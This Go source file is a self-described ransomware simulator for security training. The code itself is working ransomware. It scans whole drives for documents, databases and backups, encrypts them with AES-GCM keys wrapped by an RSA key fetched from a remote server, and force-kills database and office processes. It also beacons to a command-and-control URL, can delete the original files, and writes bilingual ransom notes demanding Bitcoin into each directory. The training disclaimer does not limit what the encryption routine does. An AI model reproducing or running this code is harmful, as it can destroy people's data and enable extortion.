package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/json"
	"encoding/pem"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// --- 勒索软件特征常量 ---
const (
	version   = "v2.7-Beta" // 版本更新，代表最终加固
	apiURL    = "https://rsa-uuid.api.yangzifun.org"
	beaconURL = "https://bad-c2-server.api.yangzifun.org/beacon_check_in"
)

// --- 默认回退配置 ---
const (
	defaultUUID      = "5137d4c3-3901-4528-bfa9-6d9ce88fa287"
	defaultPublicKey = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzlz3ZbaN2a6eEJqewEgb
vbATJjvSRNVbmpP5KtEYu39GUBU6eeuYcRHZRu/buBRJ9Ij/t0xL/xjUgdYEz3C8
G6aAq1tv8yV+9nqOhosDRNgLRcX0rBrqfioUms2aBIKwHX37dz1K5vVUh9afem6A
HwB2c3xWTYXClkPy1oPY/HiiP6vYmuynZREhlLHWek9YfAQzBODdZRlqpcBjrYM1
kCImoGE5oWYeJ+wJLX9NLqfBWKZHQiZa/tf83ZXqOpGxu6RT8NYj10RYZSEohJ10
TjkVStqZXrbh1oaWBm+Uw22i0BL6uoG4niNsKre/9Bdgaq5Q+H/VDa0pHhDGAuis
tQIDAQAB
-----END PUBLIC KEY-----`
)

// --- 勒索信内容 ---
const ransomNoteContent = `
================================================================================
   !!! ATTENTION: YOUR FILES ARE ENCRYPTED / 注意：您的文件已被加密 !!!
================================================================================

[ WARNING: Read the following carefully, or you may lose your data permanently ]
[ 警告：请仔细阅读以下内容，否则您可能永久丢失数据 ]

--------------------------------------------------------------------------------
ENGLISH version
--------------------------------------------------------------------------------

Q: What happened?
A: Your computers and servers have been locked by our security software. All your important files (including documents, photos, databases, SQL, backups, etc.) have been encrypted with strong algorithms. It is technically impossible to decrypt them without the private key held by us.

Attempts to modify or rename encrypted files may result in permanent data corruption.

Q: How to restore my files?
A: The only way to restore files is to purchase the decryption tool and private key from us.

1. Download and install Tor Browser (https://www.torproject.org/).
2. Visit our recovery page: [onion_address_placeholder]
3. Enter your unique Personal ID: %s

Payment Terms:
You must pay the ransom in Bitcoin. The price depends on how quickly you contact us.
- If you contact us within 72 hours, the price is: $X,XXX USD (BTC equivalent).
- If over 72 hours, the price will double.
- If we do not receive payment within 7 days, your decryption key will be deleted, and data will be lost permanently.

Free Decryption Test:
To prove that we can recover your files, you can send us 2 small non-important files (less than 1MB), and we will decrypt them for free.

Do not attempt to decrypt it yourself or use third-party software; this will cause permanent data loss.

--------------------------------------------------------------------------------
中文版本 (Chinese Version)
--------------------------------------------------------------------------------

问：发生了什么？
答：您的计算机和服务器已被我们的安全软件锁定。您所有的重要文件（包括文档、照片、数据库、SQL、备份等）都已被高强度算法加密。如果不使用我们持有的私钥，这在技术上是无法解密的。

试图修改或重命名加密文件可能会导致数据永久损坏。

问：如何恢复我的文件？
答：恢复文件的唯一方法是从我们这里购买解密工具和私钥。

1. 下载并安装 Tor 浏览器 (https://www.torproject.org/).
2. 访问我们的恢复页面: [此处为模拟的 .onion 地址]
3. 输入您的唯一个人ID: %s

付款条款：
您必须以比特币（Bitcoin）支付赎金。
价格取决于您与其联系的速度。
- 如果在 72 小时内联系我们，价格为：$X,XXX USD (BTC 等值)
- 如果超过 72 小时，价格将翻倍。
- 如果我们在 7 天内没有收到付款，您的解密密钥将被删除，数据将永久丢失。

免费解密测试：
为了证明我们可以恢复您的文件，您可以发送 2 个非重要的小文件（小于 1MB）给我们，我们将免费为您解密。

切勿尝试自行解密或使用第三方软件，这会导致数据永久丢失。

[攻击者组织名称/签名]

====================== [ 这是一次用于安全培训的模拟 ] ======================

不要惊慌！这是一个受控的模拟演练。但如果这是一次真实的攻击，你的网络已经被完全攻陷。
本程序不会对加密的原文件进行删除操作，如遇原文件丢失，可通过下方链接获取私钥及解密程序：
https://encrypt.yangzifun.org/
获取私钥ID是: %s

项目链接：https://github.com/yangzifun/ransom_simulator
免责声明与许可
本项目遵循 MIT 许可证请查阅 LICENSE 文件了解详情。
再次强调，此工具的创建旨在赋能**防御者**，而非赋能攻击者。请在法律和道德允许的范围内负责任地使用。

`

var (
	lockFilePath           string
	ransomNoteFileName     = "!!!_如何解密你的文件_!!!.txt"
	targetProcessesWindows = []string{
		"notepad.exe", "wordpad.exe", "winword.exe", "excel.exe", "powerpnt.exe",
		"mspaint.exe", "sqlservr.exe", "mysqld.exe", "oracle.exe", "outlook.exe",
		"thunderbird.exe", "steam.exe", "code.exe",
	}
	targetProcessesLinux = []string{
		"gedit", "vim", "nano", "mysqld", "postgres", "mongod",
	}
	excludedDirsLinux = []string{
		"/bin", "/boot", "/dev", "/etc", "/lib", "/lib64", "/proc", "/run", "/sbin", "/sys", "/usr", "/var",
		"/tmp", "/lost+found", "/Applications", "/Library", "/System", "/private",
	}
	excludedDirsWindows = []string{
		"C:\\Windows", "C:\\Program Files", "C:\\Program Files (x86)",
		"System Volume Information", "$Recycle.Bin",
	}
	targetExtensions = []string{
		".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".csv", ".txt", ".rtf",
		".zip", ".rar", ".7z", ".tar", ".gz",
		".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tif", ".svg",
		".sql", ".db", ".mdb", ".accdb", ".sqlite",
		".bak", ".backup", ".go", ".json",
	}
)

type APIResponse struct {
	PublicKeyPEM string `json:"public_key_pem"`
	UUID         string `json:"uuid"`
	Status       string `json:"status"`
	Message      string `json:"message"`
}

type fileLog struct {
	mu   sync.Mutex
	file *os.File
}

type counters struct {
	success atomic.Uint64
	failed  atomic.Uint64
}

func main() {
	forceReleaseLock()

	fmt.Println("==================================================")
	fmt.Println("      勒索软件模拟器 - 攻击已启动")
	fmt.Printf("                版本: %s\n", version)
	fmt.Println("==================================================")
	time.Sleep(1 * time.Second)

	fmt.Println("\n[阶段 1: 渗透与持久化]")
	fmt.Print("[*] 通过互斥锁建立持久化... ")
	if !createSingleInstanceLock() {
		fmt.Println("失败. [IOC] 检测到另一个实例正在运行。程序终止。")
		os.Exit(1)
	}
	fmt.Println("成功.")
	defer cleanupLockFile()

	fs := flag.NewFlagSet("ransom_simulator", flag.ExitOnError)
	workersFlag, dryRunFlag, extensionsFlag, directoryFlag, removeFlag := setupFlags(fs)
	if err := fs.Parse(os.Args[1:]); err != nil {
		_, _ = fmt.Fprintf(os.Stderr, "错误: 解析命令行参数失败: %v\n", err)
		os.Exit(1)
	}

	showWarning(*dryRunFlag)
	fmt.Println("\n[阶段 2: 防御规避与发现]")
	if *dryRunFlag {
		fmt.Println("[*] [演习模式] 跳过所有破坏性操作。")
	} else {
		go networkBeacon()
		killLockingProcesses()
		simulateDestructiveActions()
	}

	extFilter := make(map[string]bool)
	if *extensionsFlag != "" {
		exts := strings.Split(*extensionsFlag, ",")
		for _, ext := range exts {
			ext = strings.TrimSpace(ext)
			if ext != "" {
				if !strings.HasPrefix(ext, ".") {
					ext = "." + ext
				}
				extFilter[strings.ToLower(ext)] = true
			}
		}
		fmt.Printf("[*] 使用指定的扩展名: %v\n", getKeys(extFilter))
	} else {
		for _, ext := range targetExtensions {
			extFilter[ext] = true
		}
		fmt.Println("[*] 使用默认扩展名 (已包含常见文档及 .go, .json)")
	}

	var scanRoots []string
	encryptAllFormats := false
	if *directoryFlag != "" {
		dirs := strings.Split(*directoryFlag, ",")
		for _, dir := range dirs {
			dir = strings.TrimSpace(dir)
			if dir != "" {
				scanRoots = append(scanRoots, dir)
			}
		}
		fmt.Printf("[*] 扫描指定目录: %v\n", scanRoots)
		if len(scanRoots) > 0 {
			encryptAllFormats = true
			fmt.Println("[*] 目录定位模式已激活: 将加密指定目录下的【所有格式】文件")
		}
	}

	fmt.Println("[*] 正在扫描文件系统以查找有价值的目标...")
	filesToProcess := scanFiles(extFilter, scanRoots, encryptAllFormats)
	if len(filesToProcess) == 0 {
		fmt.Println("[!] 未找到任何有价值的目标文件。任务中止。")
		os.Exit(0)
	}
	fmt.Printf("[+] 目标捕获完成。已识别 %d 个待加密文件。\n", len(filesToProcess))

	var stats counters
	var finalUUID = "C2服务器连接失败"
	if *dryRunFlag {
		fmt.Println("\n[阶段 3: 载荷部署 (演习模式下跳过)]")
		fmt.Println("[*] 以下文件在真实攻击中将被加密:")
		for _, f := range filesToProcess {
			fmt.Println("  -", f)
		}
	} else {
		fmt.Println("\n[阶段 3: 载荷部署]")
		fmt.Printf("[*] 初始化 %d 个加密线程。开始执行载荷...\n", *workersFlag)
		runEncryptionWorkers(filesToProcess, *workersFlag, &stats, &finalUUID, *removeFlag)
		fmt.Println("\n[+] 载荷执行完毕。")
	}

	if !*dryRunFlag {
		fmt.Println("\n[阶段 4: 勒索信增强]")
		noteContent := fmt.Sprintf(ransomNoteContent, finalUUID, finalUUID)
		if runtime.GOOS == "linux" {
			desktopPath := getLinuxDesktopPath()
			if desktopPath != "" {
				_ = os.WriteFile(filepath.Join(desktopPath, ransomNoteFileName), []byte(noteContent), 0644)
			}
		}
		createRansomWallpaper()
	}

	fmt.Println("\n================== [ 任务完成 ] ==================")
	if *dryRunFlag {
		fmt.Printf("  - 模式:            演习模式 (Dry Run)\n")
		fmt.Printf("  - 发现目标:        %d\n", len(filesToProcess))
	} else {
		fmt.Printf("  - 模式:            实时攻击\n")
		fmt.Printf("  - 已加密文件:      %d\n", stats.success.Load())
		fmt.Printf("  - 加密失败:        %d\n", stats.failed.Load())
	}
	fmt.Println("====================================================")
	countdown("此终端将在", 10)
}

func killLockingProcesses() {
	fmt.Println("[*] 正在尝试释放文件句柄 (结束占用进程)...")
	var targets []string
	if runtime.GOOS == "windows" {
		targets = targetProcessesWindows
	} else {
		targets = targetProcessesLinux
	}

	for _, proc := range targets {
		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("taskkill", "/F", "/IM", proc)
		} else {
			cmd = exec.Command("pkill", "-9", "-f", proc)
		}
		_ = cmd.Run()
	}
	time.Sleep(1 * time.Second)
}

func forceReleaseLock() {
	lockPath := filepath.Join(os.TempDir(), "ransom_simulator_instance.lock")
	_ = os.Remove(lockPath)
}

func createSingleInstanceLock() bool {
	lockFilePath = filepath.Join(os.TempDir(), "ransom_simulator_instance.lock")
	file, err := os.OpenFile(lockFilePath, os.O_CREATE|os.O_EXCL, 0666)
	if err != nil {
		return false
	}
	_ = file.Close()
	return true
}

func cleanupLockFile() {
	if lockFilePath != "" {
		_ = os.Remove(lockFilePath)
	}
}

func setupFlags(fs *flag.FlagSet) (*int, *bool, *string, *string, *bool) {
	workers := fs.Int("workers", runtime.NumCPU(), "并发 worker 数量")
	dryRun := fs.Bool("dry-run", false, "演习模式")
	extensions := fs.String("ext", "", "指定要加密的文件扩展名 (e.g., '.txt,.pdf')")
	directory := fs.String("dir", "", "指定目标 (目录或单个文件); 将忽略扩展名限制")
	removeOriginal := fs.Bool("remove", false, "加密后删除原文件")

	fs.Usage = func() {
		_, _ = fmt.Fprintf(os.Stderr, "用法: %s [flags]\n", os.Args[0])
		fs.PrintDefaults()
	}
	return workers, dryRun, extensions, directory, removeOriginal
}

func showWarning(dryRun bool) {
	_, _ = fmt.Fprintf(os.Stderr, "\n************************** 警告 **************************\n")
	_, _ = fmt.Fprintf(os.Stderr, "此程序将自动扫描并加密指定范围内的文件。\n")
	_, _ = fmt.Fprintf(os.Stderr, "这是一个高度危险的模拟，请确保在隔离的环境中运行！\n")
	_, _ = fmt.Fprintf(os.Stderr, "**********************************************************\n\n")
	if dryRun {
		fmt.Println(">>> 已激活 [演习模式 (Dry Run)]，不会执行任何加密操作。")
	} else {
		fmt.Println(">>> 警告: 实时攻击模式已激活！将在 3 秒后自动开始...")
		time.Sleep(3 * time.Second)
	}
}

func countdown(message string, seconds int) {
	fmt.Println()
	for i := seconds; i >= 0; i-- {
		fmt.Printf("\r%s %d 秒后自动退出...", message, i)
		time.Sleep(1 * time.Second)
	}
	fmt.Println("\r程序已退出。                                  ")
}

// networkBeacon 修复了资源泄漏问题
func networkBeacon() {
	time.Sleep(3 * time.Second)
	client := http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get(beaconURL)
	if err != nil {
		return // 网络错误，无 Body 可关闭
	}
	// 无论如何，只要请求成功，就必须关闭 Body
	defer func() { _ = resp.Body.Close() }()
}

func simulateDestructiveActions() {
	time.Sleep(1 * time.Second)
	fmt.Println("[*] 启动防御规避协议 (模拟)...")
	fmt.Println("  - [IOC] 模拟: 清除 Shadow Copies / Backups")
	fmt.Println("  - [IOC] 模拟: 清除系统安全日志...")
	time.Sleep(1 * time.Second)
}

func getLinuxDesktopPath() string {
	home, err := os.UserHomeDir()
	if err != nil {
		return ""
	}
	possibleDirs := []string{filepath.Join(home, "Desktop"), filepath.Join(home, "桌面"), home}
	for _, dir := range possibleDirs {
		if _, err := os.Stat(dir); err == nil {
			return dir
		}
	}
	return home
}

func createRansomWallpaper() {
	// 实际壁纸修改逻辑...
}

func scanFiles(extFilter map[string]bool, scanRoots []string, encryptAllFormats bool) []string {
	var filesToProcess []string
	var roots []string
	if len(scanRoots) > 0 {
		roots = scanRoots
	} else {
		if runtime.GOOS == "windows" {
			for _, drive := range "CDEFGHIJKLMNOPQRSTUVWXYZ" {
				drivePath := string(drive) + ":\\"
				if _, err := os.Stat(drivePath); err == nil {
					roots = append(roots, drivePath)
				}
			}
		} else {
			roots = []string{"/"}
		}
	}
	for _, root := range roots {
		_ = filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return nil
			}
			if info.IsDir() {
				if isExcluded(path) {
					return filepath.SkipDir
				}
				return nil
			}
			shouldProcess := false
			if encryptAllFormats {
				shouldProcess = true
				fileName := filepath.Base(path)
				if fileName == ransomNoteFileName || strings.HasSuffix(fileName, ".lock") || strings.EqualFold(filepath.Ext(fileName), ".encrypted") {
					shouldProcess = false
				}
			} else {
				shouldProcess = shouldEncrypt(path, extFilter)
			}
			if shouldProcess {
				filesToProcess = append(filesToProcess, path)
			}
			return nil
		})
	}
	return filesToProcess
}

func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUUID *string, removeOriginal bool) {
	jobs := make(chan string, len(files))
	var wg sync.WaitGroup

	resp, err := fetchKeysFromAPI()
	if err != nil {
		fmt.Printf("\n[!] 连接C2获取密钥失败: %v\n", err)
		fmt.Println("[*] 警告：无法连接密钥接口，已切换至默认/离线密钥模式")
		resp = &APIResponse{
			UUID:         defaultUUID,
			PublicKeyPEM: defaultPublicKey,
			Status:       "fallback",
		}
	}
	*outUUID = resp.UUID

	finalAccurateNote := fmt.Sprintf(ransomNoteContent, resp.UUID, resp.UUID)
	var visitedDirs sync.Map

	log, err := newFileLog("ransom_log.txt")
	if err != nil {
		fmt.Printf("无法创建日志文件: %v\n", err)
	}
	if log != nil {
		defer func() { _ = log.Close() }()
	}

	for w := 0; w < numWorkers; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for file := range jobs {
				dirPath := filepath.Dir(file)
				if _, loaded := visitedDirs.LoadOrStore(dirPath, true); !loaded {
					notePath := filepath.Join(dirPath, ransomNoteFileName)
					_ = os.WriteFile(notePath, []byte(finalAccurateNote), 0644)
				}
				if err := processFile(file, resp.PublicKeyPEM, removeOriginal); err != nil {
					stats.failed.Add(1)
					if log != nil {
						log.Log(fmt.Sprintf("FAILED: %s - %v", file, err))
					}
				} else {
					stats.success.Add(1)
				}
			}
		}()
	}

	for _, file := range files {
		jobs <- file
	}
	close(jobs)

	done := make(chan bool)
	go func() {
		totalFiles := uint64(len(files))
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-done:
				return
			case <-ticker.C:
				processed := stats.success.Load() + stats.failed.Load()
				if totalFiles > 0 {
					progress := float64(processed) / float64(totalFiles) * 100
					fmt.Printf("\r[*] 进度: %.1f%% (%d/%d)", progress, processed, totalFiles)
				}
			}
		}
	}()

	wg.Wait()
	close(done)
	fmt.Println()
}

func fetchKeysFromAPI() (*APIResponse, error) {
	// 修复点 1: 创建一个空的 JSON Body "{}"
	// 服务器可能无法接受 POST 请求的 Body 为 nil
	jsonBody := []byte("{}")
	req, err := http.NewRequest("POST", apiURL, bytes.NewBuffer(jsonBody))
	if err != nil {
		return nil, fmt.Errorf("创建请求失败: %w", err)
	}
	// 保持原有的 User-Agent
	req.Header.Set("User-Agent", "Ransom-Simulator/"+version)

	// 修复点 2: 显式设置 Content-Type 防止 412/415 错误
	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{Timeout: 5 * time.Second}
	res, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("请求API失败: %w", err)
	}
	defer func() { _ = res.Body.Close() }()
	if res.StatusCode != http.StatusOK {
		// 增加调试信息，如果还报错可以看到具体原因
		body, _ := io.ReadAll(res.Body)
		return nil, fmt.Errorf("API返回异常状态码: %d, Body: %s", res.StatusCode, string(body))
	}
	body, err := io.ReadAll(res.Body)
	if err != nil {
		return nil, fmt.Errorf("读取响应体失败: %w", err)
	}
	var apiResp APIResponse
	if err := json.Unmarshal(body, &apiResp); err != nil {
		return nil, fmt.Errorf("解析JSON失败: %w", err)
	}
	if apiResp.UUID == "" || apiResp.PublicKeyPEM == "" {
		return nil, fmt.Errorf("API响应无效，缺少UUID或公钥")
	}
	return &apiResp, nil
}

func isExcluded(path string) bool {
	pathLower := strings.ToLower(path)
	var excludeList []string
	if runtime.GOOS == "windows" {
		excludeList = excludedDirsWindows
	} else {
		excludeList = excludedDirsLinux
	}
	for _, ex := range excludeList {
		exLower := strings.ToLower(ex)
		if pathLower == exLower || strings.HasPrefix(pathLower, exLower+string(filepath.Separator)) {
			return true
		}
	}
	return strings.Contains(pathLower, "$recycle.bin")
}

func shouldEncrypt(filePath string, extFilter map[string]bool) bool {
	ext := strings.ToLower(filepath.Ext(filePath))
	return extFilter[ext]
}

func getKeys(m map[string]bool) []string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	return keys
}

func processFile(filePath string, publicKeyStr string, removeOriginal bool) error {
	_ = os.Chmod(filePath, 0666)
	content, err := os.ReadFile(filePath)
	if err != nil {
		return fmt.Errorf("read failed: %w", err)
	}
	encryptedContent, err := hybridEncrypt(content, publicKeyStr)
	if err != nil {
		return fmt.Errorf("hybridEncrypt failed: %w", err)
	}
	encryptedFilePath := filePath + ".encrypted"
	if err := os.WriteFile(encryptedFilePath, encryptedContent, 0666); err != nil {
		return fmt.Errorf("write encrypted failed: %w", err)
	}
	if removeOriginal {
		if err := os.Remove(filePath); err != nil {
			trashName := filePath + ".delete_me_" + generateRandomSuffix()
			if renameErr := os.Rename(filePath, trashName); renameErr != nil {
				return fmt.Errorf("remove failed (locked): %w", err)
			}
		}
	}
	return nil
}

func generateRandomSuffix() string {
	b := make([]byte, 4)
	_, _ = rand.Read(b)
	return fmt.Sprintf("%x", b)
}

func hybridEncrypt(plaintext []byte, publicKeyStr string) ([]byte, error) {
	aesKey := make([]byte, 32)
	if _, err := io.ReadFull(rand.Reader, aesKey); err != nil {
		return nil, fmt.Errorf("生成AES密钥失败: %w", err)
	}

	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return nil, fmt.Errorf("创建AES cipher失败: %w", err)
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("创建GCM模式失败: %w", err)
	}

	nonce := make([]byte, aesGCM.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, fmt.Errorf("生成GCM nonce失败: %w", err)
	}

	ciphertext := aesGCM.Seal(nil, nonce, plaintext, nil)

	pemBlock, _ := pem.Decode([]byte(publicKeyStr))
	if pemBlock == nil {
		return nil, fmt.Errorf("解码PEM公钥失败")
	}

	pub, err := x509.ParsePKIXPublicKey(pemBlock.Bytes)
	if err != nil {
		return nil, fmt.Errorf("解析PKIX公钥失败: %w", err)
	}
	rsaPubKey, ok := pub.(*rsa.PublicKey)
	if !ok {
		return nil, fmt.Errorf("公钥不是RSA类型")
	}

	encryptedAESKey, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, rsaPubKey, aesKey, nil)
	if err != nil {
		return nil, fmt.Errorf("RSA加密AES密钥失败: %w", err)
	}

	// 最终文件结构: [Encrypted AES Key] + [Nonce] + [File Ciphertext]
	var buffer bytes.Buffer
	buffer.Write(encryptedAESKey)
	buffer.Write(nonce)
	buffer.Write(ciphertext)

	return buffer.Bytes(), nil
}

func newFileLog(filename string) (*fileLog, error) {
	f, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return nil, err
	}
	return &fileLog{file: f}, nil
}

func (l *fileLog) Log(message string) {
	l.mu.Lock()
	defer l.mu.Unlock()
	if l.file != nil {
		logLine := fmt.Sprintf("%s - %s\n", time.Now().Format("2006-01-02 15:04:05"), message)
		_, _ = l.file.WriteString(logLine)
	}
}

func (l *fileLog) Close() error {
	if l.file != nil {
		return l.file.Close()
	}
	return nil
}
